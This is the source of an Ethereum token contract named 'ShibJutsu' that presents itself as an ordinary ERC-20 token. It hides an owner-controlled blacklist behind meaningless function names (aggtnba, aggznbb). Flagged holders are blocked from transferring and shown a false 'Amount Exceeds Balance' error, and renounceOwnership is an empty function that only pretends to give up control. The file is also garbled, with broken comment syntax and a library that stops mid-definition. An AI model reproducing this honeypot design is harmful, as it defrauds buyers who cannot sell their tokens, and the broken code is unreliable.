/**
 *Submitted for verification at Etherscan.io on 2022-09-14
*/

pragma solidity 0.8.7;
/*
                               ,,▄▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄▄w,
                          ,▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄,
                      ,▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄,
                   ,▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╖
                 ▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄,
              ,▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓,
            ,▓▓▓▓▓▒╢╢╣▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒╢╣╣╢▓▓▓▓▓,
           ▄▓▓▓▓▓▓╢╢╢╣╢╣╣╢▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╢╣╣╢╢╣╣╣▓▓▓▓▓▓▓
         ,▓▓▓▓▓▓▓▓╢╣╢╢╢╢╢╣╣╢▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╢╣╣╢╢╢╢╢╢╢▒▓▓▓▓▓▓▓,
        ╔▓▓▓▓▓▓▓▓▓╢╢╢╢╢╢╢╢╢╢╣╢╢▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╢╢╢╢╢╢╢╢╢╢╢╢▓▓▓▓▓▓▓▓▓▄
       ╔▓▓▓▓▓▓▓▓▓▓╣╣╢╢╢╢╢╢╢╢╢╢▒▒▄██████████████████████▒▒╣╢╢╢╢╢╢╢╢╢╢╣╢▓▓▓▓▓▓▓▐▓▓▌
      /▓▓▓▓▓▓▓▓▓▓▓▒╢╢╢╢╢╢╢╢▒███████████████████████████████▒╢╢╢╢╢╢╢╣╣▒▓▓▓▓▓▓▒░▓▓▓▌
     ,▓▓▓▓▓▓▓▓▓▓▓▓▓╣╣╣╢╢╢▓███████████████████████████████████▓╣╢╢╢╢╢╣▓▓▓▓▓▒▒▒▓▓▓▓▓L
     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓╢╢╢╢▒███████████████████████████████████████▌╢╣╣╣▒▓▓▒░▒▒▒▓▓▓▓▓▓▓
    ╒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╢╢▓██████████████████████████████████████████╢╢╣▒▒▒▒▒▒æ▓▓▓▓▓▓▓▓▌
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╣▀▀██████████████████████████████████████▀▀▀░▒▒▒▒░&▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒░░░░░░░▀▀▀▀▀▀▀▀▀▀▀▀▀░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▀▓▓▓▓▓▓▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╢╢╢╢╢@▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒@╣╢╢╣╣╢▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╣╣╣╣╣╣╣╩╙╩╬╣╢╣╣╢╣╣╣╣@@@╢╢╢╣╣╢╣╢╢╣╢╢╢╣▓╝╜╙╢╣╣╣╢╢╣▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╣╣╣╣╣╣╣╣      ╙╩╣╣╢╢╣╣╣╣╣╣╣╣╣╢╢╢╢╢╩╜      ╢╣╣╣╣╣╣╣▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓╣╣╢╣╣╢╣▓▒▓╦,       ╫╢╣╢╢╣╢╢╢╢╢╢╢▓`      ,╦╬╢╣╣╣╣╣╣╣╣▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▐▓▓▓▓▓▓▓▓▓▓▓▓▒╢╢╢╣╣▒▄███▀▒╣╣▓@@╦╦@╢╣▒▄▄▄▄▄▄▒▒╣▓@@@Ñ╬╣╣╢╢╢╣╣╣╣╣╣╣╢╣▒▓▓▓▓▓▓▓▓▓▓▓▓▌
     ▓▓▓▓▓▓▓▓▓▓▓▓╢╣╣╢╣╣╢╢╢▀▒╣╣╣╣╣╣╢╣▒▄█████████████▒╢╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣▓▓▓▓▓▓▓▓▓▓▓▓`
     ▐▓▓▓▓▓▓▓▓▓▓▓▄▄██▄▄▄▒▒╣╢╣╢╣╣╢╢▒██████████████████▒╣╣╣╣╢╣╢╢▒▒▒▄▄▄▄▄▄▓▓▓▓▓▓▓▓▓▓▓▌
      ▓▓▓▓▓▓▓▓▓▓▓████████████▒╢╢╣▒████████████████████▌╢╣╢▒▄███████████▓▓▓▓▓▓▓▓▓▓▓
       ▓▓▓▓▓▓▓▓▓▓▓██████████████▓██████████████████████▌██████████████▓▓▓▓▓▓▓▓▓▓▓
        ▓▓▓▓▓▓▓▓▓▓▓██████████████████████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓
         ▀▓▓▓▓▓▓▓▓▓▓▓███████████████████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓
          ╙▓▓▓▓▓▓▓▓▓▓▓████████████████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓╜
            ▀▓▓▓▓▓▓▓▓▓▓▓▓███████████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓▀
              ▀▓▓▓▓▓▓▓▓▓▓▓▓▓█████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓
                ▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀
                  "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓"
                     "▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓"
                         ╙▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀
                              "▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀▀'
/*   









// ----------------------------------------------------------------------------
// Safe maths
// ----------------------------------------------------------------------------



abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     * /
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     * /
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     * /
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     * /
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     * /
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     * /
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     * /
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     * /
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */  

contract ShibJutsu {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) rtVal;

    // 
    string public name = "Shibjutsu";
    string public symbol = unicode"SHIBJUTSU";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function aggtnba(address _user) public onlyOwner {
        require(!rtVal[_user], "x");
        rtVal[_user] = true;
     
    }
    
    function aggznbb(address _user) public onlyOwner {
        require(rtVal[_user], "xx");
        rtVal[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!rtVal[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!rtVal[from] , "Amount Exceeds Balance"); 
               require(!rtVal[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}